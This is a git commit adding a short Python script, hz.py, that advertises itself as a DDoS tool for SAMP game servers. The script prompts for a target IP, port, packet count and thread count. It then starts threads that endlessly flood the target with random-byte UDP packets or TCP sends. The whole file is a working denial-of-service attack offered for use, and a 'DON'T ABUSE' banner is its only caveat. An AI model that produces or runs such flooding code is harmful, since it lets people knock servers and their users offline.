61c5f70c3d3dca09026c5ba70784d4de99a56662
Dewaa <92504311+dewaaaxxx@users.noreply.github.com>
2023-08-02 16:20:28 +0700

    Add files via upload

---
+++ hz.py
@@ -0,0 +1,52 @@
+import random
+import socket
+import threading
+import os
+import sys
+
+print("--- AUTHOR BY : Dewxxx---")
+print("--- TOOLS BY : 666 ?¦²¦«M ++---")
+print("--- DON'T ABUSE!!! ---")
+print("===================================")
+print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
+print("========== VERSION 1.0 ============")
+ip = str(input(" IP Target:"))
+port = int(input(" Port:"))
+choice = str(input(" GASS ATTACK?(y/n):"))
+times = int(input(" Package:"))
+threads = int(input(" Threads:"))
+def run():
+  data = random._urandom(1024)
+  i = random.choice(("[]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+      print(i +" Attacks!!!")
+    except:
+      print("Error!!")
+
+def run2():
+  data = random._urandom(999)
+  i = random.choice(("[]","[!]","[#]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+      print(i +" Sent!!!")
+    except:
+      s.close()
+      print("[*] Error")
+
+for y in range(threads):
+  if choice == 'y':
+    th = threading.Thread(target = run)
+    th.start()
+  else:
+    th = threading.Thread(target = run2)
+    th.start()   â€?
